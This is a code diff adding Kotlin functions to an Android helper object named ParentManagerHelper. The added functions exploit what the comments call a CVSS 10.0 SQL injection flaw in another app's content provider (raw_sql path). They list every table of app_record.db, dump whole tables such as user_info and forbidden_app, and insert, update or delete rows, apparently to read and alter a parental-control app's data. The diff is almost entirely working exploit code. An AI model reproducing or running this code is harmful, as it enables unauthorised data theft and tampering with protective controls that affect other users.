@@ -542,4 +542,200 @@ object ParentManagerHelper {
         Log.e(TAG, "所有密码尝试均失败")
         return false
     }
+
+    // ==================== AppContentProvider raw_sql 访问功能 ====================
+    // AppContentProvider 的 raw_sql 路径存在 SQL 注入漏洞（CVSS 10.0），
+    // query() 的 selection 参数被直接传给 rawQuery() 执行。
+    // 用于访问 app_record.db（包含 user_info、forbidden_app 等表）
+
+    private const val APP_PROVIDER_RAW_SQL = "content://$AUTHORITY/raw_sql"
+
+    /**
+     * 通过 AppContentProvider 的 raw_sql 漏洞获取 app_record.db 中的所有表名
+     *
+     * @param context 上下文
+     * @return 表名列表
+     */
+    fun getAllTablesAppProvider(context: Context): List<String> {
+        val tables = mutableListOf<String>()
+        val uri = Uri.parse(APP_PROVIDER_RAW_SQL)
+        var cursor: Cursor? = null
+
+        try {
+            Log.d(TAG, "开始通过 AppContentProvider raw_sql 获取所有表名...")
+            cursor = context.contentResolver.query(
+                uri, null,
+                "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name",
+                null, null
+            )
+
+            if (cursor != null) {
+                Log.d(TAG, "查询成功，共 ${cursor.count} 个表")
+                val nameIndex = cursor.getColumnIndex("name")
+                if (nameIndex >= 0) {
+                    while (cursor.moveToNext()) {
+                        val tableName = cursor.getString(nameIndex)
+                        if (tableName != null && tableName !in listOf("android_metadata", "sqlite_sequence")) {
+                            tables.add(tableName)
+                            Log.d(TAG, "发现表(AppProvider): $tableName")
+                        }
+                    }
+                }
+            } else {
+                Log.e(TAG, "Cursor 为 null，查询失败")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "通过 AppContentProvider 获取表名时发生错误", e)
+        } finally {
+            cursor?.close()
+        }
+
+        Log.d(TAG, "AppProvider 共找到 ${tables.size} 个表")
+        return tables
+    }
+
+    /**
+     * 通过 AppContentProvider 的 raw_sql 漏洞查询 app_record.db 中指定表的所有数据
+     *
+     * @param context 上下文
+     * @param tableName 表名
+     * @return 表数据的字符串表示
+     */
+    fun queryTableAppProvider(context: Context, tableName: String): String {
+        val result = StringBuilder()
+        val uri = Uri.parse(APP_PROVIDER_RAW_SQL)
+        var cursor: Cursor? = null
+
+        try {
+            Log.d(TAG, "开始通过 AppContentProvider raw_sql 查询表: $tableName")
+            val sql = "SELECT * FROM $tableName"
+            cursor = context.contentResolver.query(uri, null, sql, null, null)
+
+            if (cursor != null) {
+                result.append("查询成功，共 ${cursor.count} 行数据（来源: app_record.db）\n\n")
+
+                if (cursor.moveToFirst()) {
+                    val columnCount = cursor.columnCount
+                    for (i in 0 until columnCount) {
+                        result.append("${cursor.getColumnName(i)}\t")
+                    }
+                    result.append("\n")
+                    result.append("-".repeat(columnCount * 20))
+                    result.append("\n")
+
+                    do {
+                        for (i in 0 until columnCount) {
+                            val value = try {
+                                cursor.getString(i)
+                            } catch (e: Exception) {
+                                "<无法读取>"
+                            }
+                            result.append("$value\t")
+                        }
+                        result.append("\n")
+                    } while (cursor.moveToNext())
+
+                    Log.d(TAG, "表 $tableName 查询成功（AppProvider）")
+                } else {
+                    result.append("表为空，没有数据")
+                }
+            } else {
+                result.append("查询失败：Cursor 为 null")
+                Log.e(TAG, "查询 $tableName 失败（AppProvider）: Cursor 为 null")
+            }
+        } catch (e: SecurityException) {
+            result.append("安全异常：${e.message}")
+            Log.e(TAG, "安全异常（AppProvider）", e)
+        } catch (e: Exception) {
+            result.append("错误: ${e.message}")
+            Log.e(TAG, "查询表 $tableName 时发生错误（AppProvider）", e)
+        } finally {
+            cursor?.close()
+        }
+
+        return result.toString()
+    }
+
+    /**
+     * 通过 AppContentProvider 向 app_record.db 中的指定表插入数据
+     * 使用表名作为 URI 路径段（如 content://...AppContentProvider/user_info）
+     *
+     * @param context 上下文
+     * @param tableName 表名
+     * @param values 要插入的数据
+     * @return 插入行的 ID，失败返回 -1
+     */
+    fun insertDataAppProvider(context: Context, tableName: String, values: ContentValues): Long {
+        val uri = Uri.parse("content://$AUTHORITY/$tableName")
+
+        try {
+            Log.d(TAG, "开始通过 AppContentProvider 向表 $tableName 插入数据...")
+            val resultUri = context.contentResolver.insert(uri, values)
+
+            if (resultUri != null) {
+                val id = resultUri.lastPathSegment?.toLongOrNull() ?: -1
+                Log.d(TAG, "插入成功（AppProvider），ID: $id")
+                return id
+            } else {
+                Log.e(TAG, "插入失败（AppProvider）：返回的 URI 为 null")
+                return -1
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "通过 AppContentProvider 插入数据时发生错误", e)
+            return -1
+        }
+    }
+
+    /**
+     * 通过 AppContentProvider 更新 app_record.db 中指定表的数据
+     *
+     * @param context 上下文
+     * @param tableName 表名
+     * @param values 要更新的数据
+     * @param whereClause WHERE 子句
+     * @param whereArgs WHERE 参数
+     * @return 受影响的行数
+     */
+    fun updateDataAppProvider(
+        context: Context, tableName: String, values: ContentValues,
+        whereClause: String?, whereArgs: Array<String>?
+    ): Int {
+        val uri = Uri.parse("content://$AUTHORITY/$tableName")
+
+        try {
+            Log.d(TAG, "开始通过 AppContentProvider 更新表 $tableName 的数据...")
+            val rowsAffected = context.contentResolver.update(uri, values, whereClause, whereArgs)
+            Log.d(TAG, "更新成功（AppProvider），受影响的行数: $rowsAffected")
+            return rowsAffected
+        } catch (e: Exception) {
+            Log.e(TAG, "通过 AppContentProvider 更新数据时发生错误", e)
+            return 0
+        }
+    }
+
+    /**
+     * 通过 AppContentProvider 删除 app_record.db 中指定表的数据
+     *
+     * @param context 上下文
+     * @param tableName 表名
+     * @param whereClause WHERE 子句
+     * @param whereArgs WHERE 参数
+     * @return 受影响的行数
+     */
+    fun deleteDataAppProvider(
+        context: Context, tableName: String,
+        whereClause: String?, whereArgs: Array<String>?
+    ): Int {
+        val uri = Uri.parse("content://$AUTHORITY/$tableName")
+
+        try {
+            Log.d(TAG, "开始通过 AppContentProvider 删除表 $tableName 的数据...")
+            val rowsAffected = context.contentResolver.delete(uri, whereClause, whereArgs)
+            Log.d(TAG, "删除成功（AppProvider），受影响的行数: $rowsAffected")
+            return rowsAffected
+        } catch (e: Exception) {
+            Log.e(TAG, "通过 AppContentProvider 删除数据时发生错误", e)
+            return 0
+        }
+    }
 }
